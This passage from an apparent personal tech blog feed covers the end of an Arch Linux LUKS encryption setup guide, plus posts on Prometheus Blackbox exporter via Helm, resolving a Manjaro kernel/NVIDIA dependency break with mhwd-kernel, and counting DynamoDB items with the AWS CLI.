</span></span><span style="display:flex;"><span>/dev/sda4: BLOCK_SIZE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;512&#34;</span> UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xXX&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ntfs&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxxx&#34;</span>
</span></span><span style="display:flex;"><span>/dev/sda5: PARTLABEL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Microsoft reserved partition&#34;</span> PARTUUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxxx&#34;</span>
</span></span><span style="display:flex;"><span>/dev/mapper/root: UUID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xxxx&#34;</span> BLOCK_SIZE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4096&#34;</span> TYPE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ext4&#34;</span>
</span></span></code></pre></div><ul>
<li>Update <code>/etc/fstab</code> root partition with the new UUID:</li>
</ul>
<pre tabindex="0"><code># Static information about the filesystems.
# See fstab(5) for details.


# /dev/nvme0n1p1
UUID=xxxxxxxxxxxxxxxxx     	/boot     	vfat      	rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro0 2

# /dev/mapper/root
UUID=this-is-the-UIID-to-keep  /         	ext4      	rw,relatime	0 1
</code></pre><ul>
<li>Update <code>mkinitcpio</code> hooks so you can enter the partition password after boot:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ sudo vim /etc/mkinitcpio.conf <span style="color:#75715e"># Edit below line</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOOKS<span style="color:#f92672">=(</span>base udev autodetect modconf block filesystems keyboard consolefont fsck encrypt<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>λ mkinitcpio -P 
</span></span></code></pre></div><ul>
<li>Finally, move your GRUB themes to an available location during boot (outside <code>/root</code> partition) and edit GRUB configuration <code>/etc/default/grub</code>:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  mkdir -p /boot/themes
</span></span><span style="display:flex;"><span>λ  cp -r /usr/share/grub/themes/Stylish/ /boot/themes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>λ  vim /etc/default/grub
</span></span><span style="display:flex;"><span>GRUB_CMDLINE_LINUX_DEFAULT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loglevel=3 quiet cryptdevice=UUID=this-is-the-UIID-to-keep:root root=/dev/mapper/root&#34;</span>
</span></span><span style="display:flex;"><span>GRUB_ENABLE_CRYPTODISK<span style="color:#f92672">=</span>y
</span></span><span style="display:flex;"><span>GRUB_THEME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/boot/themes/Stylish/theme.txt&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>λ  grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></div><blockquote>
<p><a href="https://wiki.archlinux.org/title/Dm-crypt/Specialties#Discard/TRIM_support_for_solid_state_drives_%28SSD%29">TRIM Support</a> If you wish to be able to <code>TRIM</code> your device, change <code>GRUB_CMDLINE_LINUX_DEFAULT</code> to:</p>
</blockquote>
<pre tabindex="0"><code>GRUB_CMDLINE_LINUX_DEFAULT=&#34;loglevel=3 quiet cryptdevice=UUID=f435a66e-28c4-4b78-9ebe-bf87614a6fee:root:allow-discards root=/dev/mapper/root rd.luks.options=discard
</code></pre><p>And enable fstrim timer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ sudo systemctl enable fstrim.timer
</span></span><span style="display:flex;"><span>λ sudo systemctl start fstrim.timer
</span></span></code></pre></div><ol start="9">
<li>That&rsquo;s it, exit the <code>chroot</code> environment, umount everything and reboot:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ exit
</span></span><span style="display:flex;"><span>λ umount /mnt
</span></span><span style="display:flex;"><span>λ cryptsetup close /dev/mapper/root
</span></span><span style="display:flex;"><span>λ reboot
</span></span></code></pre></div>]]></content></item><item><title>Endpoints Monitoring - BlackBox Exporter</title><link>https://ruben-rodriguez.github.io/posts/kube-prom-stack-blackbox/</link><pubDate>Tue, 24 May 2022 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/kube-prom-stack-blackbox/</guid><description>&lt;p&gt;Endpoints monitoring is an important part of the infrastructure observability for discovering availability and performance problems.
In this small post, I&amp;rsquo;ll go through the general steps to setup Blackbox exporter leveraging the kube-prometheus-stack.&lt;/p&gt;</description><content type="html"><![CDATA[<p>Endpoints monitoring is an important part of the infrastructure observability for discovering availability and performance problems.
In this small post, I&rsquo;ll go through the general steps to setup Blackbox exporter leveraging the kube-prometheus-stack.</p>
<p><a href="https://github.com/prometheus-community/helm-charts/tree/main/charts/kube-prometheus-stack">kube-prometheus-stack</a> is a collection of manifests and components, including Grafana dashboards and Prometheus rules targeting the monitoring of a Kubernetes cluster. In general, the Prometheus monitoring stack consists of several scrappable endpoints that collect metrics called exporters, Prometheus itself to collect and store those metrics, and Grafana, which provides visualization of the data stored leveraging the PromQL query language:</p>
<p><img src="/img/posts/kube-prom-stack-blackbox/kube-prom-stack-blackbox.png" alt=""></p>
<blockquote>
<p>Diagram made with one of my favourite tools, <a href="https://excalidraw.com/">Excalidraw</a></p>
</blockquote>
<p>In order to collect different system metrics, the figure of exporters is one of the most important parts of Prometheus monitoring stack. There are many exporters out there and, in case you can&rsquo;t find one for the purpose you are seeking, you are very welcomed to develop your own metric exporter (there are a number of libraries for different programming languages that ease this task).</p>
<p>Now, let&rsquo;s get down to business!</p>
<p>First, we will install the blackbox exporter leveraging Helm. Remember you can customize the Blackbox exporter configuration by providing your own <code>values.yaml</code> file based on the supported <a href="https://github.com/prometheus-community/helm-charts/blob/main/charts/prometheus-blackbox-exporter/values.yaml">values</a>. I&rsquo;ll install it in the monitoring namespace of my cluster, hence <code>-n monitoring</code> parameter passed to Helm:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
</span></span><span style="display:flex;"><span>helm repo update
</span></span><span style="display:flex;"><span>helm install blackbox-exporter prometheus-community/prometheus-blackbox-exporter -n monitoring
</span></span></code></pre></div><blockquote>
<p>Please note that Helm release name matters in terms of DNS names and we will need that to refer the Blackbox exporter in the next step!</p>
</blockquote>
<p>Once Blackbox Helm chart is installed, we go on to install Prometheus stack Helm chart, but adding some additional scrapping configuration in its own <code>values.yaml</code> <a href="https://github.com/prometheus-community/helm-charts/blob/main/charts/kube-prometheus-stack/values.yaml">file</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">prometheus</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">prometheusSpec</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">additionalScrapeConfigs</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">job_name</span>: <span style="color:#ae81ff">blackbox</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">metrics_path</span>: <span style="color:#ae81ff">/probe</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">params</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">module</span>: [<span style="color:#ae81ff">http_2xx]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">static_configs</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#75715e"># Blackbox targets to scrape</span>
</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">targets</span>:
</span></span><span style="display:flex;"><span>            - <span style="color:#ae81ff">https://www.google.com</span>
</span></span><span style="display:flex;"><span>            - <span style="color:#ae81ff">https://ruben-rodriguez.github.io</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">relabel_configs</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">source_labels</span>: [<span style="color:#ae81ff">__address__]</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">target_label</span>: <span style="color:#ae81ff">__param_target</span>
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">source_labels</span>: [<span style="color:#ae81ff">__param_target]</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">target_label</span>: <span style="color:#ae81ff">target</span>
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">target_label</span>: <span style="color:#ae81ff">__address__</span>
</span></span><span style="display:flex;"><span>          <span style="color:#75715e"># This is what makes blackbox exporter reachable from Prometheus</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">replacement</span>: <span style="color:#ae81ff">blackbox-exporter-prometheus-blackbox-exporter:9115</span>
</span></span></code></pre></div><p>And install with Helm (if you executed previous helm repo commands, you can skip these ones):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
</span></span><span style="display:flex;"><span>helm repo update
</span></span><span style="display:flex;"><span>helm install prometheus prometheus-community/kube-prometheus-stack -n monitoring --values values.yaml
</span></span></code></pre></div><p>After Prometheus is installed, it should be scrapping the Blackbox exporter, you can check by port-forwarding the Prometheus service in the Cluster to a port in your machine with <code>kubectl</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl port-forward svc/prometheus-kube-prometheus-prometheus 3000:9090
</span></span></code></pre></div><p>Once you access http://localhost:3000/, in the Targets section of Prometheus, we should see the Blackbox exporter endpoints:</p>
<p><img src="/img/posts/kube-prom-stack-blackbox/targets.png" alt=""></p>
<p>Furthermore, the metrics available for these endpoints can now be queried:</p>
<p><img src="/img/posts/kube-prom-stack-blackbox/probes.png" alt=""></p>
<p><img src="/img/posts/kube-prom-stack-blackbox/probes-example.png" alt=""></p>
<p>And that&rsquo;s it, now you can start querying these metrics from Grafana and craft some awesome dashboards, or you can try one of the availables in <a href="https://grafana.com/grafana/dashboards/?search=Blackbox">Grafana Dashboards page</a></p>]]></content></item><item><title>Linux Kernel - Manjaro breaking dependencies</title><link>https://ruben-rodriguez.github.io/posts/manjaro-kernel/</link><pubDate>Fri, 15 Apr 2022 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/manjaro-kernel/</guid><description>&lt;h2 id="context"&gt;Context&lt;/h2&gt;
&lt;p&gt;One day you find yourself running your Manjaro installation as usual, and you think of installing a new fancy package which will provide you with some new fancy tool or software. Usually, before installing any package you perform an upgrade of all system packages by running &lt;code&gt;pacman -Syu&lt;/code&gt; command. And then you find:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; λ sudo pacman -Syu
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;:: Synchronizing package databases...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; core is up to date
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; extra is up to date
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; community is up to date
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; multilib is up to date
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;:: Starting full system upgrade...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;resolving dependencies...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;looking &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; conflicting packages...
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;error: failed to prepare transaction &lt;span style="color:#f92672"&gt;(&lt;/span&gt;could not satisfy dependencies&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;:: installing nvidia-utils &lt;span style="color:#f92672"&gt;(&lt;/span&gt;510.73.05-1&lt;span style="color:#f92672"&gt;)&lt;/span&gt; breaks dependency &lt;span style="color:#e6db74"&gt;&amp;#39;nvidia-utils=510.68.02&amp;#39;&lt;/span&gt; required by linux516-nvidia
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Congratulations! You are probably running a no longer supported Linux Kernel!&lt;/p&gt;</description><content type="html"><![CDATA[<h2 id="context">Context</h2>
<p>One day you find yourself running your Manjaro installation as usual, and you think of installing a new fancy package which will provide you with some new fancy tool or software. Usually, before installing any package you perform an upgrade of all system packages  by running <code>pacman -Syu</code> command. And then you find:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> λ  sudo pacman -Syu
</span></span><span style="display:flex;"><span>:: Synchronizing package databases...
</span></span><span style="display:flex;"><span> core is up to date
</span></span><span style="display:flex;"><span> extra is up to date
</span></span><span style="display:flex;"><span> community is up to date
</span></span><span style="display:flex;"><span> multilib is up to date
</span></span><span style="display:flex;"><span>:: Starting full system upgrade...
</span></span><span style="display:flex;"><span>resolving dependencies...
</span></span><span style="display:flex;"><span>looking <span style="color:#66d9ef">for</span> conflicting packages...
</span></span><span style="display:flex;"><span>error: failed to prepare transaction <span style="color:#f92672">(</span>could not satisfy dependencies<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>:: installing nvidia-utils <span style="color:#f92672">(</span>510.73.05-1<span style="color:#f92672">)</span> breaks dependency <span style="color:#e6db74">&#39;nvidia-utils=510.68.02&#39;</span> required by linux516-nvidia
</span></span></code></pre></div><p>Congratulations! You are probably running a no longer supported Linux Kernel!</p>
<p>Folks over <a href="https://endoflife.date/linux">endoflife.date</a> have a really nice site to check on different Kernels and packages releases and EOLs (End Of Life) so you can check and be ready to find your Kernel EOLed.</p>
<p>Of course, you can avoid all this nightmare by running an LTS Kernel (like Linux 5.10 at the time of writing this) but, if you are like me, you will be likely running the latest stable release; yeah, I&rsquo;m not that hardcore to run unstable releases (I use this machine to do some work on it) and, for such case, I&rsquo;d be running plain Arch Linux, which is rolling release and my favourite distribution!</p>
<h2 id="troubleshooting">Troubleshooting</h2>
<p>Let&rsquo;s first check what Kernels I do have currently installed in my system with the help of <code>mhwd-kernel</code> utility (you can find more information about it in <a href="https://wiki.manjaro.org/index.php/Manjaro_Kernels">Manjaro Wiki</a>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  sudo mhwd-kernel -li
</span></span><span style="display:flex;"><span>Currently running: 5.16.20-2-MANJARO <span style="color:#f92672">(</span>linux516<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>The following kernels are installed in your system:
</span></span><span style="display:flex;"><span>   * linux510
</span></span><span style="display:flex;"><span>   * linux516
</span></span></code></pre></div><p>Checking the <a href="https://endoflife.date/linux">endoflife.date</a> and also having a look at <a href="https://www.kernel.org/">Kernel.org</a>, I can see the current stable release is 5.17.9, hence 5.16 is not supported anymore. We can also see the available Kernels that can be installed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  sudo mhwd-kernel -l
</span></span><span style="display:flex;"><span>available kernels:
</span></span><span style="display:flex;"><span>   * linux414
</span></span><span style="display:flex;"><span>   * linux419
</span></span><span style="display:flex;"><span>   * linux49
</span></span><span style="display:flex;"><span>   * linux510
</span></span><span style="display:flex;"><span>   * linux515
</span></span><span style="display:flex;"><span>   * linux517
</span></span><span style="display:flex;"><span>   * linux518
</span></span><span style="display:flex;"><span>   * linux54
</span></span><span style="display:flex;"><span>   * linux515-rt
</span></span><span style="display:flex;"><span>   * linux517-rt
</span></span></code></pre></div><p>Using the same tool (<code>mhwd-kernel</code>), I will now install the supported stable release according to <a href="https://www.kernel.org/">Kernel.org</a> site:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  sudo mhwd-kernel -i linux517
</span></span><span style="display:flex;"><span>:: Synchronizing package databases...
</span></span><span style="display:flex;"><span> core                                                                                              166,9 KiB   <span style="color:#ae81ff">835</span> KiB/s 00:00 <span style="color:#f92672">[</span><span style="color:#75715e">#############################################################################] 100%</span>
</span></span><span style="display:flex;"><span> extra                                                                                            1896,1 KiB  10,9 MiB/s 00:00 <span style="color:#f92672">[</span><span style="color:#75715e">#############################################################################] 100%</span>
</span></span><span style="display:flex;"><span> community                                                                                           7,0 MiB  38,2 MiB/s 00:00 <span style="color:#f92672">[</span><span style="color:#75715e">#############################################################################] 100%</span>
</span></span><span style="display:flex;"><span> multilib                                                                                          177,5 KiB  4,68 MiB/s 00:00 <span style="color:#f92672">[</span><span style="color:#75715e">#############################################################################] 100%</span>
</span></span><span style="display:flex;"><span>resolving dependencies...
</span></span><span style="display:flex;"><span>looking <span style="color:#66d9ef">for</span> conflicting packages...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Packages <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> linux517-5.17.9-1  linux517-nvidia-510.73.05-1  linux517-virtualbox-host-modules-6.1.34-9
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Total Download Size:    35,83 MiB
</span></span><span style="display:flex;"><span>Total Installed Size:  159,14 MiB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>:: Proceed with installation? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
</span></span></code></pre></div><p>We can see that installing the Kernel also installs the required <code>linux517-*</code> packages, including the one that is now outdated in the EOLed Kernel (<code>linux516-nvidia</code>) and is preventing the system upgrade.</p>
<p>Once installation finishes, you can reboot the machine; listing the installed Kernels we can now see:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  sudo mhwd-kernel -li
</span></span><span style="display:flex;"><span>Currently running: 5.17.9-1-MANJARO <span style="color:#f92672">(</span>linux517<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>The following kernels are installed in your system:
</span></span><span style="display:flex;"><span>   * linux510
</span></span><span style="display:flex;"><span>   * linux516
</span></span><span style="display:flex;"><span>   * linux517
</span></span></code></pre></div><p>I&rsquo;ll now remove the EOLed Kernel by executing:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  sudo mhwd-kernel -r linux516
</span></span><span style="display:flex;"><span>checking dependencies...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Packages <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> linux516-5.15.41-1  linux516-nvidia-510.73.05-1  linux516-virtualbox-host-modules-6.1.34-9
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Total Removed Size:  140,58 MiB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>:: Do you want to remove these packages? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
</span></span><span style="display:flex;"><span>:: Running pre-transaction hooks...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>1/1<span style="color:#f92672">)</span> Removing linux initcpios...
</span></span><span style="display:flex;"><span>:: Processing package changes...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>1/3<span style="color:#f92672">)</span> removing linux516-virtualbox-host-modules                                                                                <span style="color:#f92672">[</span><span style="color:#75715e">#############################################################################] 100%</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>2/3<span style="color:#f92672">)</span> removing linux516-nvidia                                                                                                 <span style="color:#f92672">[</span><span style="color:#75715e">#############################################################################] 100%</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>3/3<span style="color:#f92672">)</span> removing linux516                                                                                                        <span style="color:#f92672">[</span><span style="color:#75715e">#############################################################################] 100%</span>
</span></span><span style="display:flex;"><span>:: Running post-transaction hooks...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>1/4<span style="color:#f92672">)</span> Arming ConditionNeedsUpdate...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>2/4<span style="color:#f92672">)</span> Updating module dependencies...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>3/4<span style="color:#f92672">)</span> Updating Kernel initcpios <span style="color:#66d9ef">for</span> Nvidia-DRM...
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>4/4<span style="color:#f92672">)</span> Updating Grub-Bootmenu
</span></span><span style="display:flex;"><span>Generating grub configuration file ...
</span></span><span style="display:flex;"><span>Found linux image: /boot/vmlinuz-5.17-x86_64
</span></span><span style="display:flex;"><span>Found initrd image: /boot/intel-ucode.img /boot/initramfs-5.17-x86_64.img
</span></span><span style="display:flex;"><span>Found initrd fallback image: /boot/initramfs-5.17-x86_64-fallback.img
</span></span><span style="display:flex;"><span>Found linux image: /boot/vmlinuz-5.10-x86_64
</span></span><span style="display:flex;"><span>Found initrd image: /boot/intel-ucode.img /boot/initramfs-5.10-x86_64.img
</span></span><span style="display:flex;"><span>Found initrd fallback image: /boot/initramfs-5.10-x86_64-fallback.img
</span></span><span style="display:flex;"><span>Found memtest86+ image: /boot/memtest86+/memtest.bin
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>Aaaaand, it&rsquo;s gone:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>λ  sudo mhwd-kernel -li
</span></span><span style="display:flex;"><span>Currently running: 5.17.9-1-MANJARO <span style="color:#f92672">(</span>linux517<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>The following kernels are installed in your system:
</span></span><span style="display:flex;"><span>   * linux510
</span></span><span style="display:flex;"><span>   * linux517
</span></span></code></pre></div><p>You should be able now to proceed with the system packages upgrade as usual leveraging <code>pacman -Syu</code> command.</p>
<h2 id="recommendations">Recommendations</h2>
<p>It&rsquo;s considered a good practice to have a LTS Kernel installed, just in case things break; I have Linux 5.10 release as LTS fallback installed.</p>
<p>Imagine you screw things when you first see the message about the dependency breaking and you opt to remove the <code>linux516-nvidia</code> package. Cool, system upgrade will work, but the next time you boot your machine you will find a nice black screen due to NVIDIA drivers now gone from your installation. Ok, you better search for your Manjaro installation media so you can <code>chroot</code> and fix things&hellip; or not!</p>
<p>As you followed the general recommendation of having a LTS Kernel installed, you will be able to boot it from the <code>Advanced options</code> in your boot loader; once booted, you can then install whatever Kernel you wish to run (a supported one), and then boot into it and work as usual.</p>
<h2 id="manjaro-kernel-management-summary">Manjaro Kernel Management Summary</h2>
<p>To list installed kernels in the machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mhwd-kernel -li
</span></span></code></pre></div><p>To list available Kernels for installation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mhwd-kernel -l
</span></span></code></pre></div><p>To remove a Kernel</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mhwd-kernel -r kernel-name
</span></span></code></pre></div><p>To add a Kernel, aka linux 418</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mhwd-kernel -i kernel-name
</span></span></code></pre></div>]]></content></item><item><title>DynamoDB item count</title><link>https://ruben-rodriguez.github.io/posts/dynamodb-item-counts/</link><pubDate>Fri, 05 Mar 2021 00:00:00 +0800</pubDate><guid>https://ruben-rodriguez.github.io/posts/dynamodb-item-counts/</guid><description>&lt;p&gt;So, let&amp;rsquo;s say you have a fancy new table where you are storing items for whatever, that&amp;rsquo;s cool! Now, imagine one day, somebody asks what&amp;rsquo;s the count for a certain column value. No problem, let&amp;rsquo;s leverage AWS CLI to retrieve such metrics (yeah, querying DynamoDB on AWS Web Console sucks)&lt;/p&gt;</description><content type="html"><![CDATA[<p>So, let&rsquo;s say you have a fancy new table where you are storing items for whatever, that&rsquo;s cool! Now, imagine one day, somebody asks what&rsquo;s the count for a certain column value. No problem, let&rsquo;s leverage AWS CLI to retrieve such metrics (yeah, querying DynamoDB on AWS Web Console sucks)</p>
<p>Okay, let&rsquo;s say we have a table called <code>fancy_table</code> that has a column called <code>animal</code> containing several animal types (cat, dog, lion, etc). Now, you wish to count how many items with that column value set to <code>dog</code>. We would build the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>aws dynamodb scan --table-name fancy_table <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span> --select <span style="color:#e6db74">&#34;COUNT&#34;</span> --filter-expression <span style="color:#e6db74">&#34;animal = :animal_type&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span> --expression-attribute-values <span style="color:#e6db74">&#39;{&#34;:animal_type&#34;:{&#34;S&#34;:&#34;dog&#34;}}&#39;</span>
</span></span></code></pre></div><p>which would return somehting like</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Count&#34;</span>: <span style="color:#ae81ff">2677</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ScannedCount&#34;</span>: <span style="color:#ae81ff">8919</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ConsumedCapacity&#34;</span>: <span style="color:#66d9ef">null</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>where <code>Count</code> is the number of items in the DynamoDB meeting the filter and <code>ScannedCount</code> the total number of items stored in the table.</p>
<p><!-- raw HTML omitted -->Careful thouhg!<!-- raw HTML omitted --> If your table contains many items and you have a low read capacity setting in your table, you might get the following exception:</p>
<blockquote>
<p>An error occurred (ProvisionedThroughputExceededException) when calling the Scan operation (reached max retries: 9): The level of configured provisioned throughput for the table was exceeded. Consider increasing your provisioning level with the UpdateTable API.</p>
</blockquote>
